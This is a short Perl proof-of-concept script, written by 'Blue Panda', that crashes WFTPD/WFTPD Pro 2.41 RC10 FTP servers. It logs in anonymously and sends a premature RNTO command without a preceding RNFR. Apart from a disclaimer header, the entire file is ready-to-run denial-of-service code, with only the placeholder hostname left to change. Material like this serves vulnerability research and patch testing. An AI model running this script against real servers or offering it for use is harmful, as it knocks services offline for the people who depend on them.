
#!/usr/bin/perl
#
# WFTPD/WFTPD Pro 2.41 RC10 denial-of-service
# Blue Panda - bluepanda@dwarf.box.sk
# http://bluepanda.box.sk/
#
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#
# Issues an RNTO command without first using RNFR, causing WFTPD to crash.
#

use IO::Socket;

$host = "ftp.host.com" ;
$port = "21";
$user = "anonymous";
$pass = "p\@nda";
$wait = 10;

# Connect to server.
print "Connecting to $host:$port...";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host,
PeerPort=>$port) || die "failed.\n";
print "done.\n";

# Login and issue premature RNTO command.
print $socket "USER $user\nPASS $pass\nRNTO x\n";

# Wait a while, just to make sure the commands have arrived.
print "Waiting...";
$time = 0;
while ($time < $wait) {
        sleep(1);
        print ".";
        $time += 1;
}

# Finished.
close($socket);
print "\nConnection closed. Finished.\n"

